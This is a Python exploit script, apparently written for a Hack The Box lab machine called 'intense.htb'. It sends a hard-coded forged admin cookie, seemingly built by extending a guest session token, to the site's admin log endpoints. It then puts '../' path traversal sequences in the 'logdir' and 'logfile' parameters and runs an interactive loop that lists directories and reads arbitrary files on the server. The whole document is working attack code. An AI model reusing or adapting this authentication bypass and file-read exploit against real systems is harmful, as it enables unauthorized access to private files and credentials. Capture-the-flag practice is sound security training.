import requests

cookie = "dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7gA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADCDt1c2VybmFtZT1hZG1pbjtzZWNyZXQ9ZjFmYzEyMDEwYzA5NDAxNmRlZjc5MWUxNDM1ZGRmZGNhZWNjZjgyNTBlMzY2MzBjMGJjOTMyODVjMjk3MTEwNTs=.4MLooEVtdN4kyfXjuC2xC9a2tnflPcBTA/Cbw741heM="
#url = "http://intense.htb/admin/log/view"
url = "http://intense.htb/admin/log/dir"
cookies = dict(auth=cookie)
p=""

def read_file(j):
    print(j)
    url = "http://intense.htb/admin/log/view"
    cookies = dict(auth=cookie)
    payload = {'logfile': "../../../../../../../../../../"+p+'/'+j}
    response = requests.post(url, data=payload,cookies=cookies)
    ret = (response.text)
    print("#"*100)
    print(ret)
    print(payload)

while(True):
    t = input()

    if ("o " == t[:2]):
        read_file(t[2:])
    else:
        t.strip()
        temp = p + "/" + t
        if (t == "r"):
            p = ""
            temp = p

        print("#"*100)
        payload = {'logdir': "../../../../../../../../../../"+temp}
        response = requests.post(url, data=payload,cookies=cookies)
        ret = (response.text)
        sc = response.status_code
        if (sc == 200) and not("Can't find" in ret):
            p = temp

        files = ret.split(',')
        for x in files:
            print(x)
        print(p)


